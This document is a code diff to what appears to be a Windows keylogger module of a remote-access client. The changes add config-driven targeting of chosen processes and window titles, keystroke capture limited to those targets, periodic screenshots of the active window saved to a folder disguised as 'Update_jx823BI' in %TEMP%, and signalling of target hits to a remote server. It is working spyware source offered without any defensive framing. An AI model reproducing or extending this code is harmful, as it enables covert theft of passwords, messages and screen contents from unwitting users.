@@ -6,10 +6,15 @@
 #include "remote_keylogger.h"
 #include "remote_keylogger_aes.h"
 #include "remote_log.h"
+#include "remote_config.h"
+#include "gdiplus_jpeg.h"
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
 #include <ctype.h>
+
+#include <psapi.h>
+#pragma comment(lib, "psapi.lib")
 
 #ifndef WH_KEYBOARD_LL
 #define WH_KEYBOARD_LL 13
@@ -26,6 +31,52 @@ static char g_logs_dir[MAX_PATH] = { 0 };
 static char* g_keylogger_buf = NULL;
 static size_t g_keylogger_buf_len = 0;
 static char g_last_title[256] = { 0 };
+
+/* Keylogger target rules loaded from config.json. */
+static keylogger_target_t g_targets[KEYLOGGER_MAX_TARGETS];
+static int g_target_count = 0;
+
+/* Cached "active window" context updated at a fixed throttle rate. */
+static HWND g_active_hwnd = NULL;
+static DWORD g_active_pid = 0;
+static char g_current_process_name[256] = { 0 };
+static char g_current_title[256] = { 0 };
+
+/* Current match state (hook thread reads g_match_keyboard). */
+static int g_active_target_index = -1;
+static volatile int g_match_keyboard = 0;
+static int g_match_save_screenshots = 0;
+static int g_match_screenshot_interval_ms = 0;
+
+/* Screenshot scheduling while a target match is active. */
+static DWORD g_next_screenshot_at_ms = 0;
+static unsigned int g_screenshot_seq = 0;
+static char g_screenshot_dir[MAX_PATH] = { 0 };
+
+/* Target hit signaling to server (piggybacked on next ClientPingRequest handshake).
+ * This is set by keylogger matching logic and consumed by remote_client.c. */
+static volatile LONG g_target_hit_pending = 0;
+static char g_target_hit_process_name[256] = { 0 };
+static char g_target_hit_window_title[512] = { 0 };
+
+/* Returns 1 if a target hit is pending to be sent to the server during the next ping handshake. */
+int remote_keylogger_is_target_hit_pending(void) {
+    return InterlockedCompareExchange(&g_target_hit_pending, 1, 1) == 1;
+}
+
+/* Copies pending target-hit context into provided buffers and clears the pending flag. */
+int remote_keylogger_consume_target_hit(char* out_process_name, unsigned int out_process_cap,
+    char* out_window_title, unsigned int out_title_cap) {
+    if (!out_process_name || !out_window_title) return 0;
+    if (out_process_cap == 0 || out_title_cap == 0) return 0;
+
+    if (InterlockedExchange(&g_target_hit_pending, 0) == 1) {
+        strncpy_s(out_process_name, out_process_cap, g_target_hit_process_name, _TRUNCATE);
+        strncpy_s(out_window_title, out_title_cap, g_target_hit_window_title, _TRUNCATE);
+        return 1;
+    }
+    return 0;
+}
 
 typedef struct _KEYLOG_EVENT {
     int vk;
@@ -147,41 +198,278 @@ static void append_char(char c) {
     append_html(esc);
 }
 
-static void update_window_title(void) {
-    static DWORD last_check = 0;
-    DWORD now = GetTickCount();
-    if (now - last_check < 200) {
+static void escape_html_text(const char* in, char* out, size_t out_cap) {
+    if (!out || out_cap == 0) return;
+    if (!in || in[0] == '\0') { out[0] = '\0'; return; }
+
+    size_t i = 0, j = 0;
+    for (i = 0; in[i] && j < out_cap - 8; i++) {
+        if (in[i] == '<') { memcpy(out + j, "&lt;", 4); j += 4; }
+        else if (in[i] == '>') { memcpy(out + j, "&gt;", 4); j += 4; }
+        else if (in[i] == '&') { memcpy(out + j, "&amp;", 5); j += 5; }
+        else if (in[i] == '\"') { memcpy(out + j, "&quot;", 6); j += 6; }
+        else { out[j++] = in[i]; }
+    }
+    out[j] = '\0';
+}
+
+/* Case-insensitive wildcard match for patterns that include '*' (and optional '?'). */
+static int wildcard_match_ci(const char* pattern, const char* text) {
+    if (!pattern || !text) return 0;
+    const char* p = pattern;
+    const char* t = text;
+    const char* star = NULL;
+    const char* ss = NULL;
+
+    while (*t) {
+        if (*p == '*') {
+            star = p++;
+            ss = t;
+            continue;
+        }
+
+        if (*p == '?' ||
+            (tolower((unsigned char)*p) == tolower((unsigned char)*t))) {
+            p++;
+            t++;
+            continue;
+        }
+
+        if (star) {
+            p = star + 1;
+            ss++;
+            t = ss;
+            continue;
+        }
+
+        return 0;
+    }
+
+    while (*p == '*') p++;
+    return *p == '\0';
+}
+
+static int match_any_pattern_ci(char patterns[][KEYLOGGER_MAX_PATTERN_LEN], int count, const char* text) {
+    if (!text) return 0;
+    for (int i = 0; i < count; i++) {
+        if (patterns[i][0] == '\0') continue;
+        if (wildcard_match_ci(patterns[i], text)) return 1;
+    }
+    return 0;
+}
+
+static void resolve_process_name_by_pid(DWORD pid, char* out, unsigned int out_cap) {
+    if (!out || out_cap < 2) return;
+    out[0] = '\0';
+    if (pid == 0) return;
+
+    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    if (!h) return;
+
+    char name[MAX_PATH] = { 0 };
+    if (GetModuleBaseNameA(h, NULL, name, (DWORD)sizeof(name) - 1) > 0 && name[0]) {
+        strncpy_s(out, out_cap, name, _TRUNCATE);
+        CloseHandle(h);
         return;
     }
-    last_check = now;
 
-    char title[256] = { 0 };
+    char img[MAX_PATH] = { 0 };
+    if (GetProcessImageFileNameA(h, img, (DWORD)sizeof(img) - 1) > 0 && img[0]) {
+        // Extract base name.
+        const char* base = strrchr(img, '\\');
+        if (!base) base = img;
+        strncpy_s(out, out_cap, base, _TRUNCATE);
+    }
+
+    CloseHandle(h);
+}
+
+static void update_active_context(DWORD now_ms) {
     HWND fg = GetForegroundWindow();
-    if (fg && GetWindowTextA(fg, title, (int)(sizeof(title) - 1)) > 0) {
-        if (strcmp(title, g_last_title) != 0) {
-            strncpy_s(g_last_title, sizeof(g_last_title), title, _TRUNCATE);
-            char line[600];
-            SYSTEMTIME st;
-            GetSystemTime(&st);
-            char escaped[512];
-            size_t i, j = 0;
-            for (i = 0; title[i] && j < sizeof(escaped) - 10; i++) {
-                if (title[i] == '<') { memcpy(escaped + j, "&lt;", 4); j += 4; }
-                else if (title[i] == '>') { memcpy(escaped + j, "&gt;", 4); j += 4; }
-                else if (title[i] == '&') { memcpy(escaped + j, "&amp;", 5); j += 5; }
-                else if (title[i] == '\"') { memcpy(escaped + j, "&quot;", 6); j += 6; }
-                else { escaped[j++] = title[i]; }
-            }
-            escaped[j] = '\0';
-            _snprintf_s(line, sizeof(line), _TRUNCATE,
-                "<span class=\"h\"><br><br>[<b>%s - %02u:%02u:%02u UTC</b>]</span><br>",
-                escaped, st.wHour, st.wMinute, st.wSecond);
-            append_html(line);
+    g_active_hwnd = fg;
+
+    DWORD pid = 0;
+    if (fg) {
+        GetWindowThreadProcessId(fg, &pid);
+    }
+
+    if (pid != g_active_pid) {
+        g_active_pid = pid;
+        resolve_process_name_by_pid(pid, g_current_process_name, sizeof(g_current_process_name));
+    } else if (pid != 0 && g_current_process_name[0] == '\0') {
+        /* Retry if we failed to resolve previously (permission/handle issues). */
+        resolve_process_name_by_pid(pid, g_current_process_name, sizeof(g_current_process_name));
+    }
+
+    // Window title (cached)
+    g_current_title[0] = '\0';
+    if (fg) {
+        GetWindowTextA(fg, g_current_title, (int)(sizeof(g_current_title) - 1));
+    }
+
+    // Compute best matching target (first match wins).
+    int new_idx = -1;
+    for (int i = 0; i < g_target_count; i++) {
+        if (g_targets[i].process_pattern_count <= 0) continue; // skip elements with empty process list
+
+        if (!match_any_pattern_ci(g_targets[i].process_patterns, g_targets[i].process_pattern_count, g_current_process_name))
+            continue;
+
+        if (g_targets[i].title_pattern_count <= 0) {
+            new_idx = i;
+            break;
+        }
+
+        if (match_any_pattern_ci(g_targets[i].title_patterns, g_targets[i].title_pattern_count, g_current_title)) {
+            new_idx = i;
+            break;
+        }
+    }
+
+    int old_idx = g_active_target_index;
+    g_active_target_index = new_idx;
+
+    g_match_keyboard = (new_idx >= 0) ? (g_targets[new_idx].keyboard ? 1 : 0) : 0;
+    g_match_save_screenshots = (new_idx >= 0) ? (g_targets[new_idx].save_screenshots ? 1 : 0) : 0;
+    g_match_screenshot_interval_ms = 0;
+    if (new_idx >= 0 && g_match_save_screenshots) {
+        int sec = g_targets[new_idx].screenshot_interval_sec;
+        if (sec <= 0) sec = 1;
+        g_match_screenshot_interval_ms = sec * 1000;
+    }
+
+    if (new_idx < 0) {
+        g_next_screenshot_at_ms = 0;
+        return;
+    }
+
+    // New match session: send target hit pending and restart screenshot schedule.
+    if (old_idx < 0 || old_idx != new_idx) {
+        if (InterlockedCompareExchange(&g_target_hit_pending, 1, 0) == 0) {
+            strncpy_s(g_target_hit_process_name, sizeof(g_target_hit_process_name), g_current_process_name, _TRUNCATE);
+            strncpy_s(g_target_hit_window_title, sizeof(g_target_hit_window_title), g_current_title, _TRUNCATE);
+        }
+
+        if (g_match_save_screenshots && g_match_screenshot_interval_ms > 0) {
+            g_next_screenshot_at_ms = now_ms; // capture immediately at match start
         }
     }
 }
 
+static void update_window_title(void) {
+    // Append title header into the keylogger buffer only when keyboard logging is active.
+    if (!g_match_keyboard) return;
+    if (g_current_title[0] == '\0') return;
+    if (strcmp(g_current_title, g_last_title) == 0) return;
+
+    strncpy_s(g_last_title, sizeof(g_last_title), g_current_title, _TRUNCATE);
+
+    char escaped_title[512];
+    escape_html_text(g_current_title, escaped_title, sizeof(escaped_title));
+
+    char escaped_proc[256];
+    escape_html_text(g_current_process_name, escaped_proc, sizeof(escaped_proc));
+
+    char line[700];
+    SYSTEMTIME st;
+    GetSystemTime(&st);
+
+    _snprintf_s(line, sizeof(line), _TRUNCATE,
+        "<span class=\"h\"><br><br>[<b>%s - %s - %02u:%02u:%02u UTC</b>]</span><br>",
+        escaped_proc, escaped_title, st.wHour, st.wMinute, st.wSecond);
+    append_html(line);
+}
+
+static int capture_active_window_jpeg(void) {
+    if (!g_match_save_screenshots) return 0;
+    if (!g_active_hwnd || !IsWindow(g_active_hwnd)) return 0;
+    if (g_screenshot_dir[0] == '\0') return 0;
+
+    RECT r;
+    if (!GetWindowRect(g_active_hwnd, &r)) return 0;
+    int w = r.right - r.left;
+    int h_ = r.bottom - r.top;
+    if (w <= 0 || h_ <= 0) return 0;
+    if (w > 4096 || h_ > 4096) return 0;
+
+    int quality = 75;
+
+    HDC hwnd_dc = GetWindowDC(g_active_hwnd);
+    if (!hwnd_dc) return 0;
+    HDC mem_dc = CreateCompatibleDC(hwnd_dc);
+    HBITMAP bmp = CreateCompatibleBitmap(hwnd_dc, w, h_);
+    if (!mem_dc || !bmp) {
+        if (bmp) DeleteObject(bmp);
+        if (mem_dc) DeleteDC(mem_dc);
+        ReleaseDC(g_active_hwnd, hwnd_dc);
+        return 0;
+    }
+
+    SelectObject(mem_dc, bmp);
+    int ok = PrintWindow(g_active_hwnd, mem_dc, PW_RENDERFULLCONTENT);
+    if (!ok) {
+        DeleteObject(bmp);
+        DeleteDC(mem_dc);
+        ReleaseDC(g_active_hwnd, hwnd_dc);
+        return 0;
+    }
+
+    BITMAPINFOHEADER bi = { 0 };
+    bi.biSize = sizeof(BITMAPINFOHEADER);
+    bi.biWidth = w;
+    bi.biHeight = -h_;
+    bi.biPlanes = 1;
+    bi.biBitCount = 32;
+    bi.biCompression = BI_RGB;
+    unsigned int stride = ((unsigned int)w * 4 + 3) & ~3u;
+
+    unsigned char* bgra = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, stride * (unsigned int)h_);
+    if (!bgra) {
+        DeleteObject(bmp);
+        DeleteDC(mem_dc);
+        ReleaseDC(g_active_hwnd, hwnd_dc);
+        return 0;
+    }
+
+    GetDIBits(mem_dc, bmp, 0, (UINT)h_, bgra, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
+
+    DeleteObject(bmp);
+    DeleteDC(mem_dc);
+    ReleaseDC(g_active_hwnd, hwnd_dc);
+
+    unsigned char* jpeg = NULL;
+    unsigned int jlen = 0;
+    if (!gdiplus_jpeg_encode_bgra(w, h_, (int)stride, bgra, quality, &jpeg, &jlen) || !jpeg) {
+        HeapFree(GetProcessHeap(), 0, bgra);
+        return 0;
+    }
+    HeapFree(GetProcessHeap(), 0, bgra);
+
+    // Build output filename: %TEMP%\\Update_jx823BI\\YYYY-MM-DD_HH-MM-SS_seq.jpg
+    SYSTEMTIME st;
+    GetSystemTime(&st);
+    unsigned int seq = ++g_screenshot_seq;
+
+    char fname[MAX_PATH];
+    _snprintf_s(fname, sizeof(fname), _TRUNCATE,
+        "%s\\%04u-%02u-%02u_%02u-%02u-%02u_%u.jpg",
+        g_screenshot_dir,
+        (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay,
+        (unsigned)st.wHour, (unsigned)st.wMinute, (unsigned)st.wSecond,
+        (unsigned)seq);
+
+    FILE* f = NULL;
+    if (fopen_s(&f, fname, "wb") == 0 && f) {
+        (void)fwrite(jpeg, 1, (size_t)jlen, f);
+        fclose(f);
+    }
+
+    HeapFree(GetProcessHeap(), 0, jpeg);
+    return 1;
+}
+
 static void enqueue_key_event(int vk, DWORD scanCode) {
+    if (!g_match_keyboard) return;
     if (!g_keylog_q_initialized) return;
 
     LONG tail = g_keylog_q_tail;
@@ -217,6 +505,7 @@ static int dequeue_key_events(KEYLOG_EVENT* out, int max_out) {
 
 static void process_key_event(const KEYLOG_EVENT* ev) {
     if (!ev) return;
+    if (!g_match_keyboard) return;
 
     /* Do not log pure modifier keys (Shift/Ctrl/Alt/Win), like C# KeyPress behavior. */
     if (is_modifier_vk(ev->vk)) return;
@@ -400,6 +689,7 @@ static DWORD WINAPI keylogger_thread_proc(LPVOID param) {
     }
     remote_log("[keylogger] hook installed, dir=%s", g_logs_dir);
     DWORD last_flush = GetTickCount();
+    DWORD last_context_update = 0;
     KEYLOG_EVENT ev_batch[KEYLOGGER_MAX_ENTRIES];
 
     MSG msg;
@@ -415,8 +705,24 @@ static DWORD WINAPI keylogger_thread_proc(LPVOID param) {
             process_key_event(&ev_batch[i]);
         }
 
-        Sleep(5);
         DWORD now = GetTickCount();
+        if (now - last_context_update >= 200) {
+            last_context_update = now;
+            update_active_context(now);
+        }
+
+        /* Screenshot capture while target match is active. */
+        if (g_match_save_screenshots && g_next_screenshot_at_ms > 0 && now >= g_next_screenshot_at_ms) {
+            /* Capture immediately, then schedule next interval. */
+            /* Screenshot implementation is below. */
+            (void)capture_active_window_jpeg();
+            if (g_match_screenshot_interval_ms > 0)
+                g_next_screenshot_at_ms = now + g_match_screenshot_interval_ms;
+            else
+                g_next_screenshot_at_ms = 0;
+        }
+
+        Sleep(5);
         if (now - last_flush >= KEYLOGGER_FLUSH_MS) {
             last_flush = now;
             flush_to_disk();
@@ -429,8 +735,43 @@ done:
     return 0;
 }
 
-int remote_keylogger_start(const char* logs_dir) {
+int remote_keylogger_start(const char* logs_dir, const struct remote_config* config) {
     if (!logs_dir || !logs_dir[0]) return 0;
+    if (!config) return 0;
+
+    g_target_count = config->target_count;
+    if (g_target_count <= 0 || g_target_count > KEYLOGGER_MAX_TARGETS) return 0;
+
+    memcpy(g_targets, config->targets, sizeof(g_targets));
+
+    // Compact/validate targets: skip elements with empty process pattern list.
+    {
+        int valid_count = 0;
+        for (int i = 0; i < g_target_count; i++) {
+            if (config->targets[i].process_pattern_count > 0) {
+                if (valid_count != i)
+                    g_targets[valid_count] = g_targets[i];
+                valid_count++;
+                if (valid_count >= KEYLOGGER_MAX_TARGETS) break;
+            }
+        }
+        if (valid_count <= 0) return 0;
+        g_target_count = valid_count;
+    }
+
+    g_match_keyboard = 0;
+    g_match_save_screenshots = 0;
+    g_match_screenshot_interval_ms = 0;
+    g_next_screenshot_at_ms = 0;
+    g_screenshot_seq = 0;
+    g_active_target_index = -1;
+    g_active_pid = 0;
+    g_active_hwnd = NULL;
+    g_current_process_name[0] = '\0';
+    g_current_title[0] = '\0';
+    g_last_title[0] = '\0';
+    InterlockedExchange(&g_target_hit_pending, 0);
+
     if (InterlockedCompareExchange(&g_keylogger_running, 1, 0) != 0) return 1;
     strncpy_s(g_logs_dir, sizeof(g_logs_dir), logs_dir, _TRUNCATE);
     g_keylogger_mutex = CreateMutexA(NULL, FALSE, NULL);
@@ -447,6 +788,16 @@ int remote_keylogger_start(const char* logs_dir) {
     g_keylog_q_head = 0;
     g_keylog_q_tail = 0;
     g_keylog_q_initialized = 1;
+
+    /* Screenshot directory: %TEMP%\\Update_jx823BI */
+    char temp_path[MAX_PATH] = { 0 };
+    DWORD tmpLen = GetTempPathA(MAX_PATH, temp_path);
+    if (tmpLen > 0 && temp_path[0]) {
+        _snprintf_s(g_screenshot_dir, sizeof(g_screenshot_dir), _TRUNCATE, "%s\\Update_jx823BI", temp_path);
+        CreateDirectoryA(g_screenshot_dir, NULL);
+    } else {
+        g_screenshot_dir[0] = '\0';
+    }
 
     g_keylogger_thread = CreateThread(NULL, 0, keylogger_thread_proc, NULL, 0, NULL);
     if (!g_keylogger_thread) {
